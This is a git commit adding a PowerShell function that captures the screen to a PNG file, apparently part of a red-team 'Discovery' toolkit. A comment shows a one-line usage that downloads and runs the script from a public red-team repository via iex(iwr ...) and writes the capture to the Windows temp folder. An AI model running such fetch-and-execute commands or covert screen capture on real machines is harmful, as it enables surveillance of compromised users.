621ea4d57cb9ba1a9f93072f85af740e1bb9d541
Bank_Security <m.molte@hotmail.it>
2019-10-02 16:38:26 +0200

    Create Take-ScreenShot-Easy-2.ps1

---
+++ Discovery/Take-ScreenShot-Easy-2.ps1
@@ -0,0 +1,37 @@
+function Take-Screenshot {
+	# iex(iwr https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Take-Screenshot.ps1);Take-Screenshot -Path C:\Windows\Temp\1.png
+	# Output file is a png
+	
+	param(
+	[Parameter(Mandatory=$True)]
+	[string]$Path
+	)
+	
+	BEGIN {
+
+	}
+	
+	PROCESS {
+		[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
+		[Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
+		
+		if(-Not [Environment]::UserInteractive) {
+			Write-Host "[-] WARNING process is not interactive your screen capture will likely fail"
+		}
+
+		$bounds = [System.Windows.Forms.Screen]::AllScreens.Bounds
+		Write-Host "[+] Screen resolution is $($bounds.Width) x $($bounds.Height)"
+		$bounds = [Drawing.Rectangle]::FromLTRB(0, 0,  $bounds.Width, $bounds.Height)
+		$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+		$graphics = [Drawing.Graphics]::FromImage($bmp)
+		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+		$bmp.Save($Path)
+		$graphics.Dispose()
+		$bmp.Dispose()
+	}
+	
+	END {
+		Write-Host "[+] Screenshot saved $($Path)"
+		Write-Host "[+] Process completed..."
+	}
+}
